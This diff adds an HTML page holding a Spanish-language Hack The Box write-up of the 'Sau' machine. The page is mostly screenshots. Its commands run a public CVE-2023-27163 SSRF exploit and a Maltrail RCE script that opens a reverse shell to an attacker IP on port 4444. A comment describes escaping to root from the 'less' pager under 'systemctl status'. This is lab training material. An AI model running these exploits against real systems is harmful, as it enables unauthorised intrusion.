@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Sau HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/sau/pasted-20260415185634.png" alt="Sau HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Sau</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>SSRF</span>
+            <span>Maltrail</span>
+            <span>Requests_Baskets</span>
+            <span>sudoers</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Request Baskets expuesto en el puerto 55555</li>
+            <li><code>Explotación</code>: SSRF en Request Baskets expone Maltrail en localhost</li>
+            <li><code>Explotación</code>: RCE en Maltrail para obtener shell inicial</li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre <code>systemctl status</code> y escape desde el paginador <code>less</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/sau/pasted-20260415232941.png" alt="Sau HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: SSRF</h2>
+          <p><a href="https://github.com/madhavmehndiratta/CVE-2023-27163/blob/main/CVE-2023-27163.py">Exploit Request Basket</a></p>
+          <div class="code-card">
+            <h3>SSRF</h3>
+            <pre><code>python3 CVE-2023-27163.py http://10.129.229.26:55555/ http://127.0.0.1:80/</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sau/pasted-20260415234303.png" alt="Sau HTB" />
+          <img class="writeup-image" src="/writeups/assets/sau/pasted-20260415234348.png" alt="Sau HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: RCE</h2>
+          <p><a href="https://raw.githubusercontent.com/apaz-dev/Maltrail-v0.53-RCE/refs/heads/main/exploit.sh">Exploit Maltrail</a></p>
+          <div class="code-card">
+            <h3>RCE</h3>
+            <pre><code>bash exploit.sh -t http://10.129.229.26:55555/jhtppw/ -i 10.10.16.178
+# Listener 4444</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sau/pasted-20260415234848.png" alt="Sau HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <img class="writeup-image" src="/writeups/assets/sau/pasted-20260416001836.png" alt="Sau HTB" />
+          <img class="writeup-image" src="/writeups/assets/sau/pasted-20260416001959.png" alt="Sau HTB" />
+          <div class="code-card">
+            <h3>less</h3>
+            <pre><code># Paginar el output del comando para lanzar una shell como root, esto se consigue poniendo la terminal más pequeña</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/sau/pasted-20260416002237.png" alt="Sau HTB" />
+          <img class="writeup-image" src="/writeups/assets/sau/pasted-20260416002310.png" alt="Sau HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>SSRF</span>
+            <span>Maltrail</span>
+            <span>Requests_Baskets</span>
+            <span>sudoers</span>
+            <span>systemctl</span>
+            <span>ledd</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
